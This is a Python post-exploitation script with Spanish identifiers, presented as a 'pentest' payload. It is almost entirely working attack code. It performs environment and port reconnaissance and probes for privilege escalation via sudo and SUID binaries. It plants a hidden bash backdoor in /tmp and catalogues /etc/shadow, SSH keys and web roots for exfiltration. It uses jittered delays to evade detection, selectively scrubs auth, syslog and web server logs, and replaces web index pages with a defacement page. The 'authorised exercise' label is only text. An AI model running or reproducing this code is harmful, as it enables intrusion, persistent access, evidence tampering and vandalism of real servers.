import os
import sys
import time
import subprocess
import socket
import threading
import base64
import hashlib
import random
import logging
from datetime import datetime
from pathlib import Path

class PersistenciaFurtiva:
    def __init__(self):
        self.usuario = os.getenv("USER")
        self.hostname = socket.gethostname()
        self.firma_payload = "ZYANETRALYS_GHOST"
        self.configurar_logging()
        
    def configurar_logging(self):
        """Configurar logging furtivo"""
        ruta_log = "/tmp/.cache_sistema"
        logging.basicConfig(
            filename=ruta_log,
            level=logging.INFO,
            format='%(asctime)s - %(message)s'
        )
        
    def verificar_entorno(self):
        """Reconocimiento avanzado del entorno"""
        info_entorno = {
            'usuario': self.usuario,
            'uid': os.getuid(),
            'gid': os.getgid(),
            'hostname': self.hostname,
            'plataforma': sys.platform,
            'version_python': sys.version,
            'directorio_trabajo': os.getcwd()
        }
        
        logging.info(f"Escaneo del entorno: {info_entorno}")
        return info_entorno
    
    def verificar_privilegios(self):
        """Verificar privilegios actuales y rutas de escalada"""
        if os.getuid() == 0:
            logging.info("Ya ejecutándose como root")
            return True
        
        # Verificar sudo sin contraseña
        try:
            resultado = subprocess.run(['sudo', '-n', 'true'], 
                                     capture_output=True, timeout=2)
            if resultado.returncode == 0:
                logging.info("Sudo sin contraseña disponible")
                return True
        except:
            pass
        
        # Buscar binarios SUID (vectores comunes de escalada)
        binarios_suid = self.encontrar_binarios_suid()
        if binarios_suid:
            logging.info(f"Binarios SUID encontrados: {binarios_suid[:5]}")
        
        return False
    
    def encontrar_binarios_suid(self):
        """Buscar binarios SUID para potencial escalada de privilegios"""
        try:
            resultado = subprocess.run(['find', '/', '-perm', '-4000', '-type', 'f', 
                                      '2>/dev/null'], capture_output=True, text=True, timeout=10)
            return resultado.stdout.strip().split('\n') if resultado.returncode == 0 else []
        except:
            return []
    
    def descubrimiento_red(self):
        """Reconocimiento básico de red"""
        try:
            # Obtener interfaces de red
            resultado = subprocess.run(['ip', 'addr', 'show'], 
                                     capture_output=True, text=True, timeout=5)
            if resultado.returncode == 0:
                logging.info("Interfaces de red descubiertas")
            
            # Verificar puertos abiertos
            puertos_comunes = [22, 80, 443, 3306, 5432, 6379]
            puertos_abiertos = []
            
            for puerto in puertos_comunes:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                resultado = sock.connect_ex(('localhost', puerto))
                if resultado == 0:
                    puertos_abiertos.append(puerto)
                sock.close()
            
            if puertos_abiertos:
                logging.info(f"Puertos abiertos encontrados: {puertos_abiertos}")
                
        except Exception as e:
            logging.error(f"Descubrimiento de red falló: {e}")
    
    def crear_puerta_trasera(self):
        """Crear un mecanismo de puerta trasera simple"""
        script_backdoor = f'''#!/bin/bash
# Script de mantenimiento del sistema
if [ "$1" == "{self.firma_payload}" ]; then
    echo "Modo mantenimiento activado"
    /bin/bash
fi
'''
        
        try:
            ruta_backdoor = "/tmp/.mantenimiento"
            with open(ruta_backdoor, 'w') as f:
                f.write(script_backdoor)
            os.chmod(ruta_backdoor, 0o755)
            logging.info(f"Puerta trasera creada en {ruta_backdoor}")
        except Exception as e:
            logging.error(f"Creación de puerta trasera falló: {e}")
    
    def retraso_furtivo(self):
        """Implementar retraso furtivo con jitter aleatorio"""
        retraso_base = 3600  # 1 hora base
        jitter = random.randint(0, 1800)  # hasta 30 min de jitter
        retraso_total = retraso_base + jitter
        
        logging.info(f"Entrando en modo furtivo por {retraso_total} segundos")
        
        # Simular el retraso en chunks para parecer menos sospechoso
        chunks = 10
        retraso_chunk = retraso_total // chunks
        
        for i in range(chunks):
            time.sleep(retraso_chunk)
            if i % 3 == 0:  # Simulación de actividad periódica
                self.simular_actividad_normal()
    
    def simular_actividad_normal(self):
        """Simular actividad normal del sistema"""
        try:
            subprocess.run(['ls', '/tmp'], capture_output=True, timeout=2)
            subprocess.run(['ps', 'aux'], capture_output=True, timeout=2)
        except:
            pass
    
    def preparar_exfiltracion_datos(self):
        """Preparar para exfiltración de datos"""
        rutas_sensibles = [
            "/etc/passwd",
            "/etc/shadow",
            "/var/log/auth.log",
            "/home/*/.ssh/",
            "/var/www/html/"
        ]
        
        objetivos_encontrados = []
        for ruta in rutas_sensibles:
            if os.path.exists(ruta) or len(subprocess.run(['find', ruta], 
                                                        capture_output=True).stdout) > 0:
                objetivos_encontrados.append(ruta)
        
        logging.info(f"Objetivos potenciales de exfiltración: {objetivos_encontrados}")
        return objetivos_encontrados
    
    def limpiar_logs(self):
        """Limpieza avanzada de logs con eliminación selectiva"""
        rutas_logs = [
            "/var/log/auth.log",
            "/var/log/syslog",
            "/var/log/kern.log",
            "/var/log/apache2/access.log",
            "/var/log/apache2/error.log",
            "/var/log/nginx/access.log",
            "/var/log/nginx/error.log"
        ]
        
        limpiados = []
        for ruta_log in rutas_logs:
            try:
                if os.path.exists(ruta_log) and os.access(ruta_log, os.W_OK):
                    # En lugar de eliminar, remover solo nuestras trazas
                    with open(ruta_log, 'r') as f:
                        lineas = f.readlines()
                    
                    # Filtrar líneas que contengan nuestra firma o actividad sospechosa
                    lineas_filtradas = [linea for linea in lineas 
                                      if self.firma_payload not in linea]
                    
                    with open(ruta_log, 'w') as f:
                        f.writelines(lineas_filtradas)
                    
                    limpiados.append(ruta_log)
            except Exception as e:
                logging.error(f"Falló limpiar {ruta_log}: {e}")
        
        logging.info(f"Logs limpiados: {limpiados}")
    
    def desfigurar_web(self):
        """Desfiguración web avanzada con respaldo"""
        rutas_web = [
            "/var/www/html/index.html",
            "/var/www/html/index.php",
            "/usr/share/nginx/html/index.html"
        ]
        
        payload = f'''<!DOCTYPE html>
<html>
<head>
    <title>Sistema Comprometido</title>
    <style>
        body {{
            background: #000;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            text-align: center;
            padding-top: 20%;
        }}
        .glitch {{
            animation: glitch 1s infinite;
        }}
        @keyframes glitch {{
            0% {{ transform: translate(0) }}
            20% {{ transform: translate(-2px, 2px) }}
            40% {{ transform: translate(-2px, -2px) }}
            60% {{ transform: translate(2px, 2px) }}
            80% {{ transform: translate(2px, -2px) }}
            100% {{ transform: translate(0) }}
        }}
        .matriz {{
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
            opacity: 0.1;
        }}
    </style>
    <script>
        // Efecto matriz de fondo
        function crearMatriz() {{
            const canvas = document.createElement('canvas');
            canvas.className = 'matriz';
            document.body.appendChild(canvas);
            
            const ctx = canvas.getContext('2d');
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            
            const caracteres = '01';
            const columnas = Math.floor(canvas.width / 20);
            const gotas = Array(columnas).fill(1);
            
            function dibujar() {{
                ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                ctx.fillStyle = '#00ff00';
                ctx.font = '15px monospace';
                
                for(let i = 0; i < gotas.length; i++) {{
                    const caracter = caracteres[Math.floor(Math.random() * caracteres.length)];
                    ctx.fillText(caracter, i * 20, gotas[i] * 20);
                    
                    if(gotas[i] * 20 > canvas.height && Math.random() > 0.975) {{
                        gotas[i] = 0;
                    }}
                    gotas[i]++;
                }}
            }}
            
            setInterval(dibujar, 33);
        }}
        
        window.onload = crearMatriz;
    </script>
</head>
<body>
    <div class="glitch">
        <h1>🏴‍☠️ SISTEMA COMPROMETIDO 🏴‍☠️</h1>
        <p>Los fantasmas estuvieron aquí – {self.firma_payload}</p>
        <p>Marca temporal: {datetime.now().strftime("%d/%m/%Y %H:%M:%S")}</p>
        <p>Objetivo: {self.hostname}</p>
        <p>Usuario: {self.usuario}</p>
        <hr>
        <p style="font-size: 12px; color: #ff0000;">
            Este es un ejercicio de pentesting autorizado<br>
            No se han causado daños reales al sistema
        </p>
    </div>
</body>
</html>'''
        
        for ruta_web in rutas_web:
            try:
                if os.path.exists(ruta_web):
                    # Crear respaldo antes de la modificación
                    ruta_respaldo = f"{ruta_web}.respaldo_{int(time.time())}"
                    subprocess.run(['cp', ruta_web, ruta_respaldo], capture_output=True)
                    
                    # Escribir nuevo contenido
                    with open(ruta_web, 'w') as f:
                        f.write(payload)
                    
                    logging.info(f"Desfiguración web completada: {ruta_web}")
                    break
            except Exception as e:
                logging.error(f"Desfiguración web falló para {ruta_web}: {e}")
    
    def mostrar_banner(self):
        """Mostrar banner de inicio"""
        banner = f"""
╔══════════════════════════════════════════════════════════════╗
║                    ZYANETRALYS PHANTOM SCRIPT                ║
║                       Prueba Pentesting                      ║
╠══════════════════════════════════════════════════════════════╣
║ Usuario actual: {self.usuario:<43} ║
║ Hostname: {self.hostname:<49} ║
║ UID: {os.getuid():<54} ║
║ Timestamp: {datetime.now().strftime('%d/%m/%Y %H:%M:%S'):<45} ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def ejecutar_payload(self):
        """Ejecución principal del payload con verificaciones comprehensivas"""
        self.mostrar_banner()
        logging.info("=== EJECUCIÓN DEL PAYLOAD INICIADA ===")
        
        print("[*] Fase 1: Reconocimiento del entorno...")
        info_entorno = self.verificar_entorno()
        self.descubrimiento_red()
        
        print("[*] Fase 2: Verificación de escalada de privilegios...")
        tiene_privilegios = self.verificar_privilegios()
        
        print("[*] Fase 3: Estableciendo mecanismo de persistencia...")
        self.crear_puerta_trasera()
        
        print("[*] Fase 4: Reconocimiento de datos sensibles...")
        objetivos = self.preparar_exfiltracion_datos()
        
        # Fase 5: Retraso furtivo (solo si no es root)
        if not tiene_privilegios and self.usuario != "root":
            print("[*] Fase 5: Modo furtivo detectado, iniciando retraso...")
            logging.info("Ejecución sin privilegios detectada, entrando en modo furtivo")
            self.retraso_furtivo()
        else:
            print("[*] Fase 5: Privilegios elevados detectados, saltando retraso...")
        
        print("[*] Fase 6: Ejecutando fase de impacto...")
        if tiene_privilegios or self.usuario != "root":
            self.limpiar_logs()
            self.desfigurar_web()
        
        print("[✓] Payload ejecutado exitosamente")
        print(f"[i] Logs guardados en: /tmp/.cache_sistema")
        print(f"[i] Puerta trasera: /tmp/.mantenimiento {self.firma_payload}")
        
        logging.info("=== EJECUCIÓN DEL PAYLOAD COMPLETADA ===")

def main():
    """Función principal de ejecución"""
    try:
        fantasma = PersistenciaFurtiva()
        fantasma.ejecutar_payload()
    except KeyboardInterrupt:
        print("\n[!] Ejecución interrumpida por el usuario")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Ejecución falló: {e}")
        logging.error(f"Error crítico: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
